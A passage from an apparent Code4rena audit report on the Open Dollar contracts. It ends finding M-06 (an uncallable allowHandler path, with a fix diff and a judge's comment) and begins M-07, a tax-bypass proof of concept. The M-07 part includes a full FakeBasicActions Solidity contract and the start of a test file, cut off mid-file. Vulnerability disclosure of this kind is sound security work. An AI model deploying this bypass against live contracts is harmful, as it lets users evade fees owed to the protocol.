class=\"mtk1\">}</span></span></span></code></pre>\n<p>Hence, it can’t call to <code>allowHandler()</code>, which give users permission to execute action within the safe</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">allowHandler</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">handlerCan</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AllowHandler</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Because of that, no one can surpass the <code>handlerAllowed</code> modifier with valid handler address:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">handlerAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_handler</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_handler</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">handlerCan</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_handler</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">HandlerNotAllowed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><code>enterSystem()</code> and <code>quitSystem()</code> use <code>handlerAllowed</code> modifier:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">enterSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_src</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">handlerAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_src</span><span class=\"mtk1\">) </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quitSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) </span><span class=\"mtk11\">handlerAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I can think of two way to achieve this:</p>\n<ol>\n<li>Add a function in SafeHandler contract that can call to <code>ODSafeManager.allowHandler()</code></li>\n<li>Add an immutable variable <code>SAFE_ID</code> in SafeHandler contract and change this to <code>ODSafeManager.allowHandler()</code>:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  function allowHandler(uint256 _safeId, address _usr, uint256 _ok) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  function allowHandler(address _usr, uint256 _ok) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   SAFEData memory _sData = _safeData[_safeId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   require(_sData.owner == msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   handlerCan[msg.sender][_usr] = _ok;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   handlerCan[_sData.safeHandler][_usr] = _ok;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   emit AllowHandler(msg.sender, _usr, _ok);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/297#issuecomment-1791358001\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how <code>allowHandler()</code> can never be called with <code>msg.sender</code> as a user’s safe handler, causing <code>enterSystem()</code> and <code>quitSystem()</code> to become uncallable. As this affects the functionality of the protocol but does not cause any loss of assets or affect the protocol’s core functionality, I believe medium severity is appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-malicious-users-are-able-to-bypass-the-tax-payment-using-making-a-fake-basicactions-contract\" style=\"position:relative;\"><a href=\"#m-07-malicious-users-are-able-to-bypass-the-tax-payment-using-making-a-fake-basicactions-contract\" aria-label=\"m 07 malicious users are able to bypass the tax payment using making a fake basicactions contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/286\">[M-07] Malicious users are able to bypass the Tax payment using making a Fake BasicActions Contract</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/286\">yashar</a></em></p>\n<p>Users can interact with the protocol without paying any taxes.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Whenever a user wants to interact with the protocol (E.g: lock collateral, generate debt, repay debt, etc) he/she should make a call to their proxy contract and the proxy contract will make a delegatecall to BasicActions contract. BasicActions contract will calculate and pay the tax on every:</p>\n<ul>\n<li>_generateDebt: <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L103\">Link to code</a></li>\n<li>_repayDebt: <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L130\">Link to code</a></li>\n<li>_lockTokenCollateralAndGenerateDebt: <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L181\">Link to code</a></li>\n<li>repayAllDebt: <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L290\">Link to code</a></li>\n<li>repayDebtAndFreeTokenCollateral: <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L356\">Link to code</a></li>\n<li>repayAllDebtAndFreeTokenCollateral: <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L384\">Link to code</a></li>\n</ul>\n<p>Given that this is a delegatecall to BasicActions contract and it can be any other contract, a malicious user will be able to deploy a Fake BasicActions contract that doesn’t contain any Tax payment mechanism and simply bypass the Tax payment.</p>\n<p>To test the scenario please make a file named <code>FakeBasicActions.sol</code> in this path: <code>test/nft/anvil</code> and copy/paste the following contract code that has no Tax payment mechanism in it:</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: GPL-3.0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.19;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ODSafeManager} from &#39;@contracts/proxies/ODSafeManager.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ODProxy} from &#39;@contracts/proxies/ODProxy.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ISAFEEngine} from &#39;@interfaces/ISAFEEngine.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ICoinJoin} from &#39;@interfaces/utils/ICoinJoin.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ITaxCollector} from &#39;@interfaces/ITaxCollector.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ICollateralJoin} from &#39;@interfaces/utils/ICollateralJoin.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {IERC20Metadata} from &#39;@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {IBasicActions} from &#39;@interfaces/proxies/actions/IBasicActions.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Math, WAD, RAY, RAD} from &#39;@libraries/Math.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {CommonActions} from &#39;@contracts/proxies/actions/CommonActions.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract FakeBasicActions {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   using Math for uint256;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function lockTokenCollateralAndGenerateDebt(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _manager,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _taxCollector,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _collateralJoin,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _coinJoin,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _safeId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _collateralAmount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _deltaWad</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _safeEngine = ODSafeManager(_manager).safeEngine();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Takes token amount from user&#39;s wallet and joins into the safeEngine</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _joinCollateral(_collateralJoin, _safeInfo.safeHandler, _collateralAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Locks token amount into the SAFE and generates debt</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _modifySAFECollateralization(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _manager,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _safeId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _collateralAmount.toInt(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Exits and transfers COIN amount to the user&#39;s address</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function generateDebt(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _manager,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _taxCollector,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _coinJoin,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _safeId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _deltaWad</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _safeEngine = ODSafeManager(_manager).safeEngine();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Generates debt in the SAFE</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _modifySAFECollateralization(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _manager,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _safeId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      0,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Moves the COIN amount to user&#39;s address</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _collectAndExitCoins(_manager, _coinJoin, _safeId, _deltaWad);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _modifySAFECollateralization(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _manager,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _safeId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    int256 _deltaCollateral,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    int256 _deltaDebt</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ODSafeManager(_manager).modifySAFECollateralization(_safeId, _deltaCollateral, _deltaDebt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _getGeneratedDeltaDebt(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _safeEngine,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes32 _cType,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _safeHandler,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _deltaWad</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) internal view returns (int256 _deltaDebt) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _rate = ISAFEEngine(_safeEngine).cData(_cType).accumulatedRate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _coinAmount = ISAFEEngine(_safeEngine).coinBalance(_safeHandler);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // If there was already enough COIN in the safeEngine balance, just exits it without adding more debt</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_coinAmount &lt; _deltaWad * RAY) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // Calculates the needed deltaDebt so together with the existing coins in the safeEngine is enough to exit wad amount of COIN tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _deltaDebt = ((_deltaWad * RAY - _coinAmount) / _rate).toInt();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // This is neeeded due lack of precision. It might need to sum an extra deltaDebt wei (for the given COIN wad amount)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _deltaDebt = uint256(_deltaDebt) * _rate &lt; _deltaWad * RAY ? _deltaDebt + 1 : _deltaDebt;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _collectAndExitCoins(address _manager, address _coinJoin, uint256 _safeId, uint256 _deltaWad) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Moves the COIN amount to proxy&#39;s address</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _transferInternalCoins(_manager, _safeId, address(this), _deltaWad * RAY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Exits the COIN amount to the user&#39;s address</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _exitSystemCoins(_coinJoin, _deltaWad * RAY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _transferInternalCoins(address _manager, uint256 _safeId, address _dst, uint256 _rad) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ODSafeManager(_manager).transferInternalCoins(_safeId, _dst, _rad);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _exitSystemCoins(address _coinJoin, uint256 _coinsToExit) internal virtual {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_coinsToExit == 0) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ICoinJoin __coinJoin = ICoinJoin(_coinJoin);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ISAFEEngine __safeEngine = __coinJoin.safeEngine();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (!__safeEngine.canModifySAFE(address(this), _coinJoin)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      __safeEngine.approveSAFEModification(_coinJoin);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // transfer all coins to msg.sender (proxy shouldn&#39;t hold any system coins)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    __coinJoin.exit(msg.sender, _coinsToExit / RAY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _joinCollateral(address _collateralJoin, address _safe, uint256 _wad) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ICollateralJoin __collateralJoin = ICollateralJoin(_collateralJoin);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IERC20Metadata _token = __collateralJoin.collateral();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Transforms the token amount into ERC20 native decimals</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _decimals = _token.decimals();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _wei = _wad / 10 ** (18 - _decimals);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_wei == 0) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Gets token from the user&#39;s wallet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _token.transferFrom(msg.sender, address(this), _wei);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Approves adapter to take the token amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _token.approve(_collateralJoin, _wei);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Joins token collateral into the safeEngine</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    __collateralJoin.join(_safe, _wei);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n</details>\n<p>And also make another file called <code>NinjaTests.t.sol</code> in this path: <code>test/nft/anvil</code> and copy/paste the following test code in it:</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: GPL-3.0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.19;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &#39;forge-std/Test.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {AnvilFork} from &#39;@test/nft/anvil/AnvilFork.t.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {WSTETH, ARB, CBETH, RETH, MAGIC} from &#39;@script/GoerliParams.s.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {IERC20} from &#39;@openzeppelin/token/ERC20/IERC20.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {SafeERC20} from &#39;@openzeppelin/token/ERC20/utils/SafeERC20.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Vault721} from &#39;@contracts/proxies/Vault721.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {IODSafeManager} from &#39;@interfaces/proxies/IODSafeManager.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ISAFEEngine} from &#39;@interfaces/ISAFEEngine.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ODSafeManager} from &#39;@contracts/proxies/ODSafeManager.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ODProxy} from &#39;@contracts/proxies/ODProxy.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {FakeBasicActions} from &#39;@test/nft/anvil/FakeBasicActions.sol&#39;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract NinjaTests is AnvilFork {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using SafeERC20 for IERC20;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  FakeBasicActions fakeBasicActions;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 